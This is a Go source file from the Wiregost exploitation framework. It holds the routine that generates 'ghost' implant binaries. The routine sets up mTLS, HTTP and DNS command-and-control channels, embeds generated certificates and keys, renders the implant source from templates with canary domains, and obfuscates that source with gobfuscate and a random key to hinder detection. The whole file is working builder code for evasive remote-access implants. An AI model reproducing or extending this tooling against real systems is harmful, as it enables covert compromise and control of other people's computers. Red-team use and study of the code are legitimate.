// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package generate

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"html/template"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/gobuffalo/packr"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/certs"
	"github.com/maxlandon/wiregost/server/gobfuscate"
	"github.com/maxlandon/wiregost/server/gogo"
	"github.com/maxlandon/wiregost/util"
)

// This function is a little too long, we should probably refactor it as some point
func renderGhostGoCode(config *GhostConfig, goConfig *gogo.GoConfig) (string, error) {
	target := fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH)
	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
		return "", fmt.Errorf("Invalid compiler target: %s", target)
	}

	if config.Name == "" {
		config.Name = GetCodename()
	}
	buildLog.Infof("Generating new ghost implant binary '%s'", config.Name)

	config.MTLSc2Enabled = isC2Enabled([]string{"mtls"}, config.C2)
	config.HTTPc2Enabled = isC2Enabled([]string{"http", "https"}, config.C2)
	config.DNSc2Enabled = isC2Enabled([]string{"dns"}, config.C2)

	ghostsDir := GetGhostsDir() // ~/.wiregost/ghosts
	projectGoPathDir := path.Join(ghostsDir, config.GOOS, config.GOARCH, config.Name)
	os.MkdirAll(projectGoPathDir, 0700)
	goConfig.GOPATH = projectGoPathDir

	// Cert PEM encoded certificates
	serverCACert, _, _ := certs.GetCertificateAuthorityPEM(certs.ServerCA)
	ghostCert, ghostKey, err := certs.GhostGenerateECCCertificate(config.Name)
	if err != nil {
		return "", err
	}
	config.CACert = string(serverCACert)
	config.Cert = string(ghostCert)
	config.Key = string(ghostKey)

	// binDir - ~/.wiregost/ghosts/<os>/<arch>/<name>/bin
	binDir := path.Join(projectGoPathDir, "bin")
	os.MkdirAll(binDir, 0700)

	// srcDir - ~/.wiregost/ghosts/<os>/<arch>/<name>/src
	srcDir := path.Join(projectGoPathDir, "src")
	assets.SetupGoPath(srcDir)            // Extract GOPATH dependency files
	err = util.ChmodR(srcDir, 0600, 0700) // Ensures src code files are writable
	if err != nil {
		buildLog.Errorf("fs perms: %v", err)
		return "", err
	}

	ghostPkgDir := path.Join(srcDir, "github.com", "maxlandon", "wiregost") // "main"
	os.MkdirAll(ghostPkgDir, 0700)

	// Load code template
	ghostBox := packr.NewBox("../../ghost")
	for index, boxName := range srcFiles {

		// Gobfuscate doesn't handle all the platform specific code
		// well and the renamer can get confused when symbols for a
		// different OS don't show up. So we just filter out anything
		// we're not actually going to compile into the final binary
		suffix := ".go"
		if strings.Contains(boxName, "_") {
			fileNameParts := strings.Split(boxName, "_")
			suffix = "_" + fileNameParts[len(fileNameParts)-1]
			if strings.HasSuffix(boxName, "_test.go") {
				buildLog.Infof("Skipping (test): %s", boxName)
				continue
			}
			osSuffix := fmt.Sprintf("_%s.go", strings.ToLower(config.GOOS))
			archSuffix := fmt.Sprintf("_%s.go", strings.ToLower(config.GOARCH))
			if !strings.HasSuffix(boxName, osSuffix) && !strings.HasSuffix(boxName, archSuffix) {
				buildLog.Infof("Skipping file wrong os/arch: %s", boxName)
				continue
			}
		}

		ghostGoCode, _ := ghostBox.FindString(boxName)

		// We need to correct for the "github.com/maxlandon/wiregost/ghost/foo" imports, since Go
		// doesn't allow relative imports and "ghost" is a subdirectory of
		// the main "wiregost" repo we need to fake this when coping the code
		// to our per-compile "GOPATH"
		var ghostCodePath string
		dirName := filepath.Dir(boxName)
		var fileName string
		// Skip dllmain files for anything non windows
		if boxName == "dllmain.go" || boxName == "dllmain.h" || boxName == "dllmain.c" {
			if config.GOOS != "windows" {
				continue
			} else if !config.IsSharedLib {
				continue
			}
		}
		if config.Debug || strings.HasSuffix(boxName, ".c") || strings.HasSuffix(boxName, ".h") {
			fileName = filepath.Base(boxName)
		} else {
			fileName = fmt.Sprintf("s%d%s", index, suffix)
		}
		if dirName != "." {
			// Add an extra "sliver" dir
			dirPath := path.Join(ghostPkgDir, "ghost", dirName)
			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
				buildLog.Infof("[mkdir] %#v", dirPath)
				os.MkdirAll(dirPath, 0700)
			}
			ghostCodePath = path.Join(dirPath, fileName)
		} else {
			ghostCodePath = path.Join(ghostPkgDir, fileName)
		}

		fGhost, _ := os.Create(ghostCodePath)
		buf := bytes.NewBuffer([]byte{})
		buildLog.Infof("[render] %s", ghostCodePath)

		// Render code
		ghostCodeTmpl, _ := template.New("ghost").Parse(ghostGoCode)
		ghostCodeTmpl.Execute(buf, config)

		// Render canaries
		buildLog.Infof("Canary domain(s): %v", config.CanaryDomains)
		canaryTempl := template.New("canary").Delims("[[", "]]")
		canaryGenerator := &CanaryGenerator{
			GhostName:     config.Name,
			ParentDomains: config.CanaryDomains,
		}
		canaryTempl, err := canaryTempl.Funcs(template.FuncMap{
			"GenerateCanary": canaryGenerator.GenerateCanary,
		}).Parse(buf.String())
		canaryTempl.Execute(fGhost, canaryGenerator)

		if err != nil {
			buildLog.Infof("Failed to render go code: %s", err)
			return "", err
		}
	}

	if !config.Debug {
		buildLog.Infof("Obfuscating source code ...")
		obfgoPath := path.Join(projectGoPathDir, "obfuscated")
		pkgName := "github.com/maxlandon/wiregost"
		obfSymbols := config.ObfuscateSymbols
		obfKey := randomObfuscationKey()
		obfuscatedPkg, err := gobfuscate.Gobfuscate(*goConfig, obfKey, pkgName, obfgoPath, obfSymbols)
		if err != nil {
			buildLog.Infof("Error while obfuscating ghost implant%v", err)
			return "", err
		}
		goConfig.GOPATH = obfgoPath
		buildLog.Infof("Obfuscated GOPATH = %s", obfgoPath)
		buildLog.Infof("Obfuscated ghost package: %s", obfuscatedPkg)
		ghostPkgDir = path.Join(obfgoPath, "src", obfuscatedPkg) // new "main"
	}
	if err != nil {
		buildLog.Errorf("Failed to save ghost config %s", err)
	}
	return ghostPkgDir, nil
}

func randomObfuscationKey() string {
	randBuf := make([]byte, 64) // 64 bytes of randomness
	rand.Read(randBuf)
	digest := sha256.Sum256(randBuf)
	return fmt.Sprintf("%x", digest[:encryptKeySize])
}
